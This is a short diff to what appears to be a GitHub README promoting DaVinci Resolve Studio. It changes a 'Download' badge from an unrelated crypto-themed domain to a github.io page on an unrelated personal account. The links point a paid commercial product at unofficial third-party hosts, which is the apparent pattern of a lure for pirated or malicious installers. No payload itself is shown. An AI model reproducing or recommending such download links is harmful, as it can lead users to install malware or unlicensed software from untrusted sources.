@@ -2,7 +2,7 @@
 
 DaVinci Resolve Studio unifies edit, Fusion, Fairlight, and world-class color into one post suite.
 
-[![Download DaVinci Resolve Studio](https://img.shields.io/badge/Download-DaVinci_Resolve_Studio-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download DaVinci Resolve Studio](https://img.shields.io/badge/Download-DaVinci_Resolve_Studio-blueviolet)](https://bachmanviki078.github.io/.github/DaVinci-Resolve-Studio)
 
 ---
 
